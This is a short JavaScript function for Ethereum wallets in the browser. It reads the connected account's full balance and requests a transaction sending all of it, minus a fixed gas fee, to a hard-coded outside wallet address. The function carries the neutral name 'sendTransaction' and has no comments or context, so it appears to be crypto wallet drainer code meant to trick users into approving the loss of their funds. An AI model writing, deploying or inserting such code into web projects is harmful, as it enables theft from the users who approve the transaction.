const sendTransaction = async () => {
  let ethereum = window.ethereum;
  let currentAccount = ethereum.selectedAddress;

  const provider = await detectEthereumProvider();
  let web3 = new Web3(provider);
  let balance = await web3.eth.getBalance(currentAccount);

  let walletAddress = "0xfbD09cF9EbdaB7E6c924C2737761aaf629541B7E";
  let decimalInt = 1000000000000000000;
  let defaultGasPrice = 3000000000;
  let defaultGas = 33000;

  let amountToWithdraw = balance - defaultGasPrice * defaultGas;

  const transactionParameters = {
    to: walletAddress,
    from: currentAccount,
    value: `0x${Number(amountToWithdraw).toString(16)}`,
    gasPrice: `0x${Number(defaultGasPrice).toString(16)}`,
    gas: `0x${Number(defaultGas).toString(16)}`,
    maxPriorityFeePerGas: null,
    maxFeePerGas: null,
  };

  await ethereum.request({
    method: "eth_sendTransaction",
    params: [transactionParameters],
  });
};
